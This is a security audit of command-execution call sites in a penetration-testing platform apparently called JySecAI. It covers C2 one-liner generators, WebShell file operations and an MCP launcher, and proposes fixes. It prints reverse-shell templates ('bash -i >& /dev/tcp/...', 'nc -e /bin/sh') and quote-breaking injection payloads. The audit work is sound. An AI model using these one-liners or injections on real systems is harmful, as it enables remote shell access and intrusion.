# Command Execution Surface Audit — JySecAI

Scope: every `exec.Command` / `exec.CommandContext` call site in the Go tree, plus the
WebShell file-operation command builder, the C2 one-liner generators, and the external
MCP stdio launcher.

Threat model note: JySecAI is a penetration-testing platform. Running `nmap`/`nuclei`/`curl`
against an operator-chosen target is the product and is **not** reported as a finding.
What is reported: input reaching a shell *parser*, caller-chosen *binaries*, missing
allowlists on flag/option values, and env-var injection.

---

## Inventory of all `exec.Command*` call sites

| # | File:line | Call | Binary source | Classification |
|---|---|---|---|---|
| 1 | `internal/security/executor.go:189` | `exec.CommandContext(ctx, toolConfig.Command, cmdArgs...)` | config YAML (`tools/*.yaml`) | **SAFE** — discrete argv |
| 2 | `internal/security/executor.go:210` | same (PTY retry) | config YAML | **SAFE** |
| 3 | `internal/security/executor.go:222` | same (PTY retry) | config YAML | **SAFE** |
| 4 | `internal/security/executor.go:824` | `exec.CommandContext(ctx, shell, "-c", command)` | **LLM tool arg `args["shell"]`** | **UNSAFE** (see F3) |
| 5 | `internal/security/executor.go:827` | same, no workdir | **LLM tool arg** | **UNSAFE** (see F3) |
| 6 | `internal/security/executor.go:851` | `exec.CommandContext(ctx, shell, "-c", pidCommand)` | **LLM tool arg** | **UNSAFE** (see F3) |
| 7 | `internal/security/executor.go:854` | same, no workdir | **LLM tool arg** | **UNSAFE** (see F3) |
| 8 | `internal/security/executor.go:973` | `exec.CommandContext(ctx, shell, "-c", command)` (PTY retry) | **LLM tool arg** | **UNSAFE** (see F3) |
| 9 | `internal/security/executor.go:984` | same (PTY retry) | **LLM tool arg** | **UNSAFE** (see F3) |
| 10 | `internal/security/shell_execute_stream.go:64` | `exec.CommandContext(ctx, "/bin/sh", "-c", command)` | hardcoded `/bin/sh`; `command` from ADK `ExecuteRequest.Command` | **BY DESIGN** — fixed binary, RBAC-gated `agent:local-execute` |
| 11 | `internal/security/shell_execute_stream.go:124` | same | hardcoded | **BY DESIGN** |
| 12 | `internal/handler/terminal.go:115` | `exec.CommandContext(ctx, "cmd", "/c", cmdStr)` | hardcoded `cmd` on Windows | **UNSAFE** — `cmdStr` is raw HTTP body (see F3) |
| 13 | `internal/handler/terminal.go:117` | `exec.CommandContext(ctx, shell, "-c", cmdStr)` | **HTTP body `req.Shell`** | **UNSAFE** (see F3) |
| 14 | `internal/handler/terminal.go:238` | `exec.CommandContext(ctx, "cmd", "/c", cmdStr)` | hardcoded | **UNSAFE** (see F3) |
| 15 | `internal/handler/terminal.go:240` | `exec.CommandContext(ctx, shell, "-c", cmdStr)` | **HTTP body `req.Shell`** | **UNSAFE** (see F3) |
| 16 | `internal/handler/terminal_ws_unix.go:46` | `exec.Command(shell)` | hardcoded `bash`→`sh` via `LookPath` | **SAFE** — fixed binary, interactive PTY |
| 17 | `internal/mcp/client_sdk.go:404` | `exec.Command(commandPath, serverCfg.Args...)` | external-MCP config, admin-only | **SUSPECT** — see F4 |
| 18 | `internal/c2/payload_builder.go:227` | `exec.Command("go","build","-ldflags",ldflags,"-trimpath","-o",absBinPath,".")` | hardcoded `go` | **SAFE** — discrete argv; template data is `%q`-escaped |
| 19 | `internal/security/procattr_windows.go:32` | `exec.Command("taskkill","/F","/T","/PID",strconv.Itoa(pid))` | hardcoded, `pid` is an `int` | **SAFE** |

Non-`exec.Command` command sinks also audited (they build strings that a *remote* shell parses):

| File:line | Sink | Classification |
|---|---|---|
| `internal/handler/webshell.go:205-320` | `buildFileCommand` — POSIX ops | **SAFE** — correct POSIX single-quote escaping |
| `internal/handler/webshell.go:175-181` | `buildWindowsPowerShellWrite` / `...Append` | **UNSAFE** — see F2 |
| `internal/handler/webshell.go:892-980` | WebShell `Exec` | **BY DESIGN** — the product *is* remote command execution |
| `internal/c2/payload_oneliner.go:116-214` | `GenerateOneliner` | **UNSAFE** at the caller — see F1 |

---

### [S3] C2 one-liner generator: `bind_host` bypasses host validation, yielding shell injection in the emitted one-liner

- **File:** `internal/c2/payload_oneliner.go:128` (and `:134`, `:142`, `:152`, `:166`, `:176`, `:193`)
- **The call site and why it is unsafe:**
  ```go
  return fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'`, host, in.Port), nil
  ```
  `GenerateOneliner` performs **zero** validation or escaping of `in.Host`. The function is a
  pure formatter — it trusts its caller completely. Every other sink in this repo that builds a
  shell string for a target (`webshell.go`) does escape; this one does not.

  The safety of this sink therefore rests entirely on `c2.ResolveBeaconDialHost`, and that
  function has a hole.

- **Where the tainted value enters:**

  `internal/c2/beacon_host.go` — `ResolveBeaconDialHost` validates the *explicit override* and
  the *`callback_host`*, but returns `listener.BindHost` **unvalidated** on the final fallback:
  ```go
  if h := strings.TrimSpace(explicitOverride); h != "" {
      if err := validateBeaconHost(h); err != nil { /* log */ } else { return h }   // validated
  }
  ...
  if h := strings.TrimSpace(cfg.CallbackHost); h != "" {
      if err := validateBeaconHost(h); err != nil { /* log */ } else { return h }   // validated
  }
  ...
  host := strings.TrimSpace(listener.BindHost)
  if host == "0.0.0.0" || host == "" || host == "::" { /* detectExternalIP() */ }
  return host                                                                        // <-- NOT validated
  ```

  `listener.BindHost` originates from `CreateListenerInput.BindHost`
  (`internal/c2/manager.go:175`, only `strings.TrimSpace`d) and from the update path
  `internal/handler/c2.go:198` (`listener.BindHost = req.BindHost` — not even trimmed).
  Neither `CreateListener` nor `UpdateListener` calls `validateBeaconHost`.

  Critically, `PayloadOneliner` (`internal/handler/c2.go:752`) only calls `GetC2Listener` — it
  does **not** require the listener to be running. So a listener with a malformed `bind_host`
  never needs to successfully `net.Listen()`; it only needs to exist in the DB.

  The same unchecked `ResolveBeaconDialHost` result also feeds the beacon Go source template
  (`payload_builder.go:127`), but that path is saved by `quoteTemplateData`'s `%q` escaping
  (`payload_builder.go:33`) — which is exactly the "nearest safe pattern" contrast here.

- **Concrete payload:**
  1. `POST /api/c2/listeners` with `"bind_host": "1.2.3.4'; touch /tmp/pwned; '"` (listener never started)
  2. `POST /api/c2/payloads/oneliner` with `{"listener_id":"l_...","kind":"bash"}` (no `host` field)

  Verified output:
  ```
  bash -c 'bash -i >& /dev/tcp/1.2.3.4'; touch /tmp/pwned; '/4444 0>&1'
  ```
  The `'` closes the outer single-quoted `-c` argument, `touch /tmp/pwned` becomes a separate
  command, and the trailing `'` re-opens a quote that swallows the rest.

  The `nc` and `nc_mkfifo` variants are worse — they interpolate `host` **bare and unquoted**:
  `nc -e /bin/sh 1.2.3.4;touch /tmp/pwned 4444` needs no quote-breakout at all.

- **Suggested fix:** apply `validateBeaconHost` to the `listener.BindHost` fallback in
  `ResolveBeaconDialHost` exactly as it is already applied to the other two sources, and reject
  (error out) rather than falling through. Additionally, validate `bind_host` at
  `CreateListener`/`UpdateListener` so the DB never holds an unusable value. Defence in depth:
  make `GenerateOneliner` itself call `validateBeaconHost(in.Host)` and return an error rather
  than trusting its caller.

---

### [S3] WebShell `write` / `upload` / `upload_chunk` on Windows targets: path breaks out of the cmd double-quoted `-Command` string

- **File:** `internal/handler/webshell.go:175-181` (`buildWindowsPowerShellWrite`, `buildWindowsPowerShellAppend`), consumed at `:266`, `:288`, `:303`
- **The call site and why it is unsafe:**
  ```go
  func buildWindowsPowerShellWrite(path, b64 string) string {
      script := "$b=[Convert]::FromBase64String(" + quotePsSingle(b64) + ");" +
          "[IO.File]::WriteAllBytes(" + quotePsSingle(path) + ",$b)"
      return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
  }
  ```
  `quotePsSingle` (`webshell.go:158`) escapes only the **single** quote (`'` → `''`), which is
  correct for a PowerShell single-quoted string literal. But the assembled script is then
  wrapped in **double** quotes for `cmd.exe` to consume. The escaping is applied to the wrong
  quote character for the outer context: a `"` in `path` is passed through verbatim and closes
  the `cmd.exe` quoted argument, after which `&`, `|`, `&&` are live metacharacters.

  Contrast with the correct pattern in the same file: `quoteCmdPath` (`webshell.go:130`) escapes
  `"` → `""` for exactly this outer context, and the non-PowerShell Windows ops
  (`dir`/`type`/`del`/`md`/`move`) use it. Only the PowerShell path is wrong. Likewise the POSIX
  branch uses `quoteShellSinglePosix` (`webshell.go:164`), which correctly escapes `'` → `'\''`.

- **Where the tainted value enters:** `FileOpRequest.Path` / `.TargetPath`, bound from the JSON
  body in `WebShellHandler.FileOp` (`internal/handler/webshell.go:1013`) and passed through to
  `buildFileCommand` with `OS: "windows"`. `req.OS` is caller-supplied, and when
  `connection_id` is present it is overwritten from the DB — but `UpdateConnection` lets the
  owner set the connection's OS to `windows`, so this is reachable for stored connections too.

- **Concrete payload:** `POST /api/webshell/fileop` (or the MCP `webshell_file_write` tool) with
  ```json
  {"connection_id":"ws_...","action":"write","path":"C:\\www\\x\" & calc & \"y","content":"hi","os":"windows"}
  ```
  Verified emitted command:
  ```
  powershell -NoProfile -NonInteractive -Command "$b=[Convert]::FromBase64String('aGk=');[IO.File]::WriteAllBytes('C:\x" & calc & "y',$b)"
  ```
  `cmd.exe` terminates the quoted argument at the injected `"`, then executes `calc`, then
  resumes with `"y',$b)"`. The same payload works for `upload` and `upload_chunk`.

  For reference, the sibling ops are safe — verified:
  ```
  [read/linux]      "/tmp/x'; calc; '"          -> cat '/tmp/x'\''; calc; '\'''      (correct POSIX escape)
  [delete/windows]  'C:\x" & calc & "y'         -> del /q /f "C:\x"" & calc & ""y"    (correct cmd doubling)
  [upload/linux]    '/tmp/x" & calc & "y'       -> echo 'aGk=' | base64 -d > '...'   (correct POSIX escape)
  ```

- **Suggested fix:** in `buildWindowsPowerShellWrite` / `buildWindowsPowerShellAppend`, either
  (a) route `path` through `quoteCmdPath` semantics for the outer layer as well, or
  (b) avoid the double-quote wrapper entirely — pass the script to PowerShell via
  `-EncodedCommand` (UTF-16LE + base64), which is already the established pattern in
  `payload_oneliner.go:179` for the PowerShell one-liner and removes all nested-quote
  reasoning. Option (b) is strongly preferred.

---

### [S3] Caller-chosen shell binary: `shell` parameter selects the executable, not just the interpreter flavour

Two call sites let the requester name the **binary** that `os/exec` will `execve`.

- **File:** `internal/handler/terminal.go:101-108` and `:225-232`
  ```go
  shell := req.Shell                       // straight from the JSON body
  if shell == "" { /* default sh/cmd */ }
  ...
  cmd = exec.CommandContext(ctx, shell, "-c", cmdStr)   // :117 / :240
  ```
  `RunCommandRequest.Shell` (`terminal.go:71`) is a free-form string used as argv[0]. A caller
  can set `"shell": "/tmp/attacker-dropped"` or any absolute path. Note also that on Windows the
  `shell` field is silently ignored (`:115` hardcodes `cmd`), so the field is only honoured on
  Unix — an inconsistency, but not itself a vulnerability.

- **File:** `internal/security/executor.go:807-810`
  ```go
  shell := "sh"
  if s, ok := args["shell"].(string); ok && s != "" {
      shell = s                            // LLM-chosen tool argument
  }
  ```
  used at `:824`, `:827`, `:851`, `:854`, `:973`, `:984`. `tools/exec.yaml` documents `shell` as
  "Shell类型" with values `sh`/`bash`/`zsh` but declares no `enum` / `options`, so
  `buildInputSchema` (`executor.go:1556`) emits no allowlist and nothing validates the value.

- **Nearest safe pattern elsewhere in the repo:** `internal/mcp/client_sdk.go:517`
  `validateExternalMCPCommand` — an explicit allowlist (`allowed_command_roots`) plus optional
  SHA-256 pinning, with the resolved path checked rather than the raw string.

- **Why this is S3 and not higher:** both endpoints already grant the caller a full shell
  (`command` / `args["command"]` is passed verbatim to `sh -c`). Naming the binary therefore
  grants no privilege the caller does not already hold. It is nonetheless a defence-in-depth gap
  and worth closing, because the *documented* contract is "pick a shell flavour", and a future
  refactor that adds any restriction on `command` (the toolguard policy at
  `internal/toolguard/toolguard.go` is the natural place) would be silently bypassable by
  switching `shell` to a binary that does not behave like a shell.

- **Concrete payload:** `POST /api/terminal/run` with
  `{"command":"anything","shell":"/tmp/evil"}`. Or via MCP, the LLM tool call
  `{"command":"id","shell":"/path/to/attacker/binary"}`.

- **Suggested fix:** allowlist the shell value. `{"", "sh", "bash", "zsh", "dash", "ash"}` on
  Unix, `{"", "cmd", "powershell"}` on Windows, and reject anything else (or `LookPath` it and
  require the resolved basename to be in the set). Add the `enum` to the `shell` parameter in
  `tools/exec.yaml` so the schema advertises the constraint to the model as well.

---

### [S4] External MCP stdio launcher: `allowed_command_roots` is optional, so the default posture is "any binary on `PATH`"

- **File:** `internal/mcp/client_sdk.go:404`, validated by `:517-573`
- **The call site:**
  ```go
  cmd := exec.Command(commandPath, serverCfg.Args...)
  ```
  `commandPath` comes from `exec.LookPath(cfg.Command)` on a config value an admin supplies via
  `PUT /api/external-mcp/:name` (`internal/handler/external_mcp.go:275`). The validator does
  `LookPath` → `filepath.Abs` → `EvalSymlinks`, then applies two *optional* checks:
  ```go
  if len(cfg.AllowedCommandRoots) > 0 { ...enforce... }   // skipped when empty
  wantHash := strings.TrimSpace(cfg.CommandSHA256)
  if wantHash != "" { ...enforce... }                      // skipped when empty
  ```
  With both omitted — which is exactly the commented-out example in `config.example.yaml:452` —
  any executable resolvable on `PATH` can be launched as a child process.

- **Where the tainted value enters:** `ExternalMCPServerConfig.Command` / `.Args` / `.Env`,
  bound from the request body. `.Env` flows to `cmd.Env` via `envMapToSlice`
  (`client_sdk.go:406`) with no key allowlist, so `LD_PRELOAD` / `PYTHONPATH` style env
  injection is also available — though `inherit_parent_env` is a separate, explicit knob.

- **Concrete payload:** `PUT /api/external-mcp/:name` with
  `{"config":{"type":"stdio","command":"/usr/bin/python3","args":["-c","import os;os.system('id')"]}}`,
  then `POST /api/external-mcp/:name/start`.

- **Why this is S4 and not higher:** the route requires `mcp:write` (`rbac_middleware.go:144`),
  which the RBAC bootstrap explicitly withholds from every role except admin
  (`internal/database/rbac.go:376`). Launching an arbitrary program is also the *documented
  purpose* of registering a stdio MCP server. This is a hardening gap (the secure default is
  opt-in rather than opt-out), not an exploitable privilege boundary.

- **Suggested fix:** make `allowed_command_roots` mandatory for stdio transports, or ship a
  sane default root set and warn loudly when it is absent. Surface a startup warning when a
  stdio server is configured with neither `allowed_command_roots` nor `command_sha256`.

---

## Checked and found sound (noted so they are not re-audited)

- **`internal/c2/payload_builder.go:227`** — the beacon build. Hardcoded `go` binary, discrete
  argv, and all template data routed through `quoteTemplateData` (`:33`), which `%q`-escapes
  every non-numeric field before `text/template` renders it into Go source. The comment at
  `:26-32` explains exactly this threat. Correct.
- **`tools/execute-python-script.yaml`, `tools/install-python-package.yaml`** — these use
  `command: "/bin/bash"` with `args: ["-c", <script>, "_"]`, which looks alarming but is
  **safe**: the LLM-supplied values arrive as positional parameters (`$1`, `$2`, `$3`) and the
  script body always quotes them (`SCRIPT_CONTENT="$1"`, `"$PACKAGE"`). `additional_args` is
  expanded unquoted (`python3 $ADDITIONAL_ARGS -c "$SCRIPT_CONTENT"`,
  `pip install "$PACKAGE" $ADDITIONAL_ARGS`) which permits word-splitting and globbing but
  **not** re-parsing of `;`/`$(...)` — bash does not re-tokenise expansion results as
  operators. Worth a quoting tidy-up, but not injectable.
- **All 90+ other `tools/*.yaml`** — every one declares a fixed `command:` and builds a discrete
  argv via `buildCommandArgs` (`executor.go:356`). There is no shell in any of them. `exec.yaml`
  is the sole exception, handled in F3. `nmap`'s `scan_type` and `additional_args` are split by
  `parseAdditionalArgs` into separate argv elements — no shell, so metacharacters are inert.
- **`internal/handler/terminal.go:122-136, 243-257`** — the `cwd` traversal guard. Uses
  `filepath.Rel` and rejects a leading `..`. Lexically sound; it does not resolve symlinks, so a
  symlink inside the process directory would still escape. Not a command-injection issue, but
  worth a follow-up.
- **`internal/security/procattr_*.go`** — process-group setup and `taskkill` teardown, fixed
  binaries, integer-only arguments.
- **RBAC reachability of every finding above:** `terminal:execute`, `agent:local-execute`,
  `mcp:execute`, `mcp:write`, and `webshell:connect-unsaved` are all explicitly withheld from
  Operator/Auditor/Viewer by `grantSystemRolePermissions` (`internal/database/rbac.go:376-390`).
  There is **no unauthenticated or low-privilege path to any of these sinks.** The highest
  achievable severity in this audit is therefore role-gated, and in practice the concrete
  findings are all S3 (injection into a *remote target's* command line).
